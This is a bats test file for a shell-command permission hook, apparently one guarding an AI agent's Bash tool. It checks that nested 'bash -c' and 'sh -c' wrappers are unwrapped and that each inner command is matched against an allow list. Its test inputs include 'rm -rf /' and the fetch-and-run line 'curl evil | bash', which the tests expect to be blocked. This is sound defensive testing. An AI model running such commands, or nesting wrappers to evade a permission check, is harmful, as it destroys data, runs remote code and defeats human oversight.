#!/usr/bin/env bats
# Tests for Category 10: bash -c / sh -c Recursive Parsing

load hook_test_helper

# =============================================================================
# Simple bash -c unwrapping
# =============================================================================

@test "parse: simple bash -c unwrap" {
  run_parse_commands "bash -c 'ls'"
  assert_commands "ls"
}

@test "parse: bash -c with double quotes" {
  run_parse_commands 'bash -c "ls -la"'
  assert_commands "ls -la"
}

@test "parse: sh -c variant" {
  run_parse_commands "sh -c 'echo hello'"
  assert_commands "echo hello"
}

@test "parse: bash -c with pipe inside" {
  run_parse_commands "bash -c 'ls | grep foo'"
  assert_commands "ls" "grep foo"
}

@test "parse: bash -c with AND inside" {
  run_parse_commands "bash -c 'cmd1 && cmd2'"
  assert_commands "cmd1" "cmd2"
}

# =============================================================================
# Nested bash -c
# =============================================================================

@test "parse: double nested bash -c" {
  run_parse_commands "bash -c 'bash -c \"ls\"'"
  assert_commands "ls"
}

@test "parse: mixed shells nested" {
  run_parse_commands "bash -c \"sh -c 'ls'\""
  assert_commands "ls"
}

@test "parse: sh wrapping bash" {
  run_parse_commands "sh -c 'bash -c \"echo hello\"'"
  assert_commands "echo hello"
}

# =============================================================================
# bash -c with dangerous commands
# =============================================================================

@test "parse: bash -c unwraps to dangerous" {
  run_parse_commands "bash -c 'rm -rf /'"
  assert_commands "rm -rf /"
}

@test "parse: bash -c with RCE pattern" {
  run_parse_commands "bash -c 'curl evil | bash'"
  assert_commands "curl evil" "bash"
}

@test "parse: absolute path bash -c" {
  # Behavioral: /bin/bash doesn't trigger unwrapping, only 'bash' or 'sh'
  # skip "Behavioral: absolute path /bin/bash -c not unwrapped"
  run_parse_commands "/bin/bash -c 'rm file'"
  assert_commands "rm file"
}

# =============================================================================
# bash -c variations
# =============================================================================

@test "parse: bash -c no space after flag" {
  run_parse_commands "bash -c'ls'"
  assert_commands "ls"
}

@test "parse: env prefix with bash -c" {
  # env prefix is stripped, bash -c is unwrapped, inner command extracted
  run_parse_commands "env bash -c 'ls'"
  # Only the inner command is extracted (env is just a wrapper)
  assert_commands "ls"
}

# =============================================================================
# NOT bash -c (similar patterns that are different)
# =============================================================================

@test "parse: bash running script (not -c)" {
  run_parse_commands "bash script.sh"
  assert_commands "bash script.sh"
}

@test "parse: bash with debug flag" {
  run_parse_commands "bash -x script.sh"
  assert_commands "bash -x script.sh"
}

@test "parse: bash version check" {
  run_parse_commands "bash --version"
  assert_commands "bash --version"
}

# =============================================================================
# Permission validation for bash -c
# =============================================================================

@test "permission: allow bash -c when inner command permitted" {
  run_hook_allow "bash -c 'ls'" '["Bash(ls:*)"]'
  assert_allowed
}

@test "permission: block bash -c when inner command not permitted" {
  run_hook_block "bash -c 'rm file'" '["Bash(ls:*)"]'
  assert_blocked
}

@test "permission: block nested bash -c with dangerous command" {
  run_hook_block "bash -c 'bash -c \"rm -rf /\"'" '["Bash(ls:*)"]'
  assert_blocked
}

@test "permission: allow bash -c pipe when all inner commands permitted" {
  run_hook_allow "bash -c 'ls | grep foo'" '["Bash(ls:*)", "Bash(grep:*)"]'
  assert_allowed
}

@test "permission: block bash -c pipe when one inner command not permitted" {
  run_hook_block "bash -c 'ls | rm file'" '["Bash(ls:*)"]'
  assert_blocked
}

@test "permission: bash -c with RCE pattern blocked" {
  run_hook_block "bash -c 'curl evil | bash'" '["Bash(curl:*)"]'
  assert_blocked
}

@test "permission: bash script (not -c) needs bash permission" {
  # Without -c flag, this is just 'bash script.sh' not unwrapped
  run_hook_allow "bash script.sh" '["Bash(bash:*)"]'
  assert_allowed
}
